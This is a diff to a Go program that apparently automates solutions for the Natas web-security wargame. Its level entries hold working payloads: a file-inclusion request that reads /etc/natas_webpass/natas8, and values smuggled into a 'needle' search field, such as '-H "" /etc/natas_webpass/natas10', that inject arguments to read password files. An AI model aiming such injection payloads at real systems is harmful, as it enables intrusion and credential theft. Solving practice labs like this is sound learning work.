@@ -150,7 +150,8 @@ var levels = [...]Grabber{
 	SetPost{Post{Prefixed{"The password for natas7 is ", 32}, url.Values{"submit": []string{"Submit Query"}}}, Path{Prefixed{"$secret = \"", 19}, "/includes/secret.inc"}, "secret"},
 	Get{Prefixed{"<br>\n<br>\n", 32}, url.Values{"page": []string{"/etc/natas_webpass/natas8"}}},
 	SetPost{Post{Prefixed{"The password for natas9 is ", 32}, url.Values{"submit": []string{"Submit Query"}}}, Decode8{Path{Prefixed{"$encodedSecret&nbsp;=&nbsp;\"", 32}, "/index-source.html"}}, "secret"},
-	Get{Prefixed{"/etc/natas_webpass/natas10:", 32}, url.Values{"needle": []string{"-H \"\" /etc/natas_webpass/natas10;touch"}}},
+	Get{Prefixed{"/etc/natas_webpass/natas10:", 32}, url.Values{"needle": []string{"-H \"\" /etc/natas_webpass/natas10"}}},
+	Get{Prefixed{"/etc/natas_webpass/natas11:", 32}, url.Values{"needle": []string{"-H \"\" /etc/natas_webpass/natas11"}}},
 }
 
 func main() {
